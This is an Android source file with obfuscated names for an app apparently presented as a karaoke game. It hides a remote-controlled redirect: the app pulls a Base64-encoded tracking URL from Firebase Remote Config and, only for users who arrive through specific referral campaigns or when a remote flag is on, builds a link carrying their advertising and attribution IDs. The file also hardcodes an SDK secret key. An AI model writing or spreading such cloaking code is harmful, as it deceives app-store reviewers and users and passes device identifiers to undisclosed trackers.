package com.clement.karaokefrog.jdkhfkjhsdfhdsf

import android.app.Application
import android.os.Bundle
import android.os.Looper
import android.util.Log
import com.affise.attribution.Affise
import com.affise.attribution.init.AffiseInitProperties
import com.affise.attribution.referrer.AffiseReferrerData.KEYS.installReferrer
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.android.installreferrer.api.ReferrerDetails

import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.facebook.FacebookSdk
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.onesignal.OneSignal
import com.clement.karaokefrog.jkdsfhjkdshfjksdf.dshjkdshsdjkdsh
import com.clement.karaokefrog.jkdsfhjkdshfjksdf.sdhjkdshdskhds
import com.clement.karaokefrog.jkdsfhjkdshfjksdf.decodeLinkFB
import com.clement.karaokefrog.dsjkhgkjshdgjksfhddkgs.appsFlayerID
import com.clement.karaokefrog.dsjkhgkjshdgjksfhddkgs.sdjhjkfdshfkjshd
import com.clement.karaokefrog.dsjkhgkjshdgjksfhddkgs.dslfj
import com.clement.karaokefrog.dsjkhgkjshdgjksfhddkgs.kldjfkljdf
import com.clement.karaokefrog.fsjkdgfhdsghhsgh.deleteRemainingLine
import com.clement.karaokefrog.fsjkdgfhdsghhsgh.extractAffiseAffcId
import com.clement.karaokefrog.fsjkdgfhdsghhsgh.parseNamign
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.net.URLEncoder
import java.util.logging.Handler

var parseNamign = emptyMap<String,String>()

class myApplication : Application() {

    companion object {
        var lksjdkdsjds = {}
        var klsdjlkjds = {}
    }

    override fun onCreate() {
        super.onCreate()
        setAffise()
        // fireBaseRemoteConfig()
        myReferer()
        setFacebookSDK()
        setAdId()
        setAppsFlayer()
        setOneSignal()
    }

    private fun setOneSignal() {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId(sdjhjkfdshfkjshd)
        OneSignal.promptForPushNotifications()
    }

    fun setAppsFlayer() {

////////////////////////////////////TEST/////////////////////////
        AppsFlyerLib.getInstance().init(appsFlayerID, AppsFlayerListner, applicationContext)
        AppsFlyerLib.getInstance().start(applicationContext, appsFlayerID, object :
            AppsFlyerRequestListener {
            override fun onSuccess() {
                Log.d("appsFlayer", "Launch sent successfully")
            }

            override fun onError(errorCode: Int, errorDesc: String) {
                Log.d(
                    "appsFlayer", "Launch failed to be sent:\n" +
                            "Error code: " + errorCode + "\n"
                            + "Error description: " + errorDesc
                )
            }
        })


    }

    fun setAffise() {
//////////////////////////////TEST REFER?///////////////////////////////////////////
        /*   val testRefer = extractAffiseAffcId("referrer=771a62de-bbc3-4c0e-8a61-65b75944881d&affise_affc_id=app//key/sub1/sub2&clickid=%7Bclickid%7D")?:"eror"
        Log.d("test1",testRefer)

        fireBaseRemoteConfig(
            //extractAffiseAffcId(referrer?:"eror")?:"eror"
            testRefer
        )
*/
//////////////////////////////////////////////////////////////////////////////////
        val properties = AffiseInitProperties(
            "270", //Change to your app id
            "bb200319-d64b-4fc0-9013-4497864ad2bb", //Change to your SDK secretKey

        )
        //    Log.d("test",Affise.getStatus())
        Affise.init(this, properties)
        Affise.getReferrer { referrer ->
            var ref = extractAffiseAffcId(
        //        URLEncoder.encode(
                    referrer ?: ""
          //              ?: "", "utf-8") ?: ""
            ) ?: ""
            fireBaseRemoteConfig(ref)
            Log.d("test9", ref)
        }



    }
    private fun fireBaseRemoteConfig(reffer:String) {
           Log.d("test5","process")
        val dsjkhjkfhdsfhds = FirebaseRemoteConfig.getInstance()
        dsjkhjkfhdsfhds.fetchAndActivate()
            .addOnCompleteListener { dzmjdshfjksd ->

                if (dzmjdshfjksd.isSuccessful) {
                    val fireBaseValue =    // "aHR0cHM6Ly90cmFja3lvdXJ0cmFmZi5jb20vd3RZM1gy"
                     FirebaseRemoteConfig.getInstance().getString(kldjfkljdf)
                    val state: Boolean = FirebaseRemoteConfig.getInstance().getBoolean(dslfj)

                    Log.d("test6", fireBaseValue)
                    if (fireBaseValue.isNotBlank()) {
                        try {

                            decodeLinkFB = deleteRemainingLine(android.util.Base64.decode(fireBaseValue, android.util.Base64.DEFAULT).decodeToString())
                            Log.d("test3",decodeLinkFB)
                            Log.d("test4",fireBaseValue)
                            if (AppsFlayerListner.dkfjklsdjfkldsjf) {
                                logic(state,reffer)
                            } else {
                                AppsFlayerListner.kldjzkldjfsd = {
                                    logic(state,reffer)
                                }
                            }

                            return@addOnCompleteListener

                        } catch (_: Exception) {

                        }
                    }

                }else{
                    Log.d("test7", "eror" )
                }

                lksjdkdsjds()
            }
    }

    fun myReferer()
    {
        lateinit var referrerClient: InstallReferrerClient

        referrerClient = InstallReferrerClient.newBuilder(this).build()
        referrerClient.startConnection(object : InstallReferrerStateListener {

            override fun onInstallReferrerSetupFinished(responseCode: Int) {
                when (responseCode) {
                    InstallReferrerClient.InstallReferrerResponse.OK -> {

                        Log.d("test16","OK")
                        Log.d("test20" )

                    }
                    InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED -> {
                        Log.d("test17","FEATURE_NOT_SUPPORTED")
                    }
                    InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE -> {
                        Log.d("test18","SERVICE_UNAVAILABLE")
                    }
                }
            }

            override fun onInstallReferrerServiceDisconnected() {
                // Try to restart the connection on the next request to
                // Google Play by calling the startConnection() method.
            }
        })
    }
    fun logic(state: Boolean, reffer:String) {

        val appsFlyerID = AppsFlyerLib.getInstance().getAppsFlyerUID(this)!!
        if (!state) {
            if (reffer//AppsFlayerListner.campaign?
            .startsWith("app//")
            != true) {
                lksjdkdsjds()
                return
            }
        }
        //////////////////Test//////////////////
        parseNamign = parseNamign (reffer)
        val jsdhjkfhsdkjf = //kjdfmhkjhg(AppsFlayerListner.campaign)+
            parseNamign  (reffer)+
         //   kjdfmhkjhg  ("app//uu123/test1/test2/test3/test4/test5/test6") +
                mapOf("sub9" to Affise.getRandomUserId()
                    , "sub10" to dshjkdshsdjkdsh
                    , "sub11" to appsFlyerID)
        Log.d("test",jsdhjkfhsdkjf.toString())

        val jksdhfkjhsdjfk = if (decodeLinkFB.contains("?key=")) {
            decodeLinkFB.take(decodeLinkFB.indexOf('?') + 1)
        } else {
            decodeLinkFB
        }
      //  sdhjkdshdskhds = jksdhfkjhsdjfk + jsdhjkfhsdkjf.map { if(it.key=="key") it.value else it.key + "=" + it.value  }.joinToString(separator = "&")
        if(parseNamign.size == 0){
            Log.d("test","if")
            sdhjkdshdskhds = "$jksdhfkjhsdjfk?sub9=${Affise.getRandomUserId()}&sub10=${dshjkdshsdjkdsh}&sub11=${appsFlyerID}"
        }else{
            Log.d("test","else")
            sdhjkdshdskhds = "$jksdhfkjhsdjfk${jsdhjkfhsdkjf.get("key")}?${jsdhjkfhsdkjf.map { if(it.key =="key") "" else it.key + "=" + it.value  }.joinToString(separator = "&")}"
}
        klsdjlkjds()
        /////////////////////////////////////////TEST/////////////////////////////
        Log.d("test",sdhjkdshdskhds)
    }

    fun setFacebookSDK(){

        FacebookSdk.fullyInitialize()
    }

   fun setAdId(){

        CoroutineScope(Dispatchers.IO).launch {
            try {
                dshjkdshsdjkdsh = AdvertisingIdClient.getAdvertisingIdInfo(this@myApplication).id!!
            } catch (_: Exception) {
            }
        }
    }
}

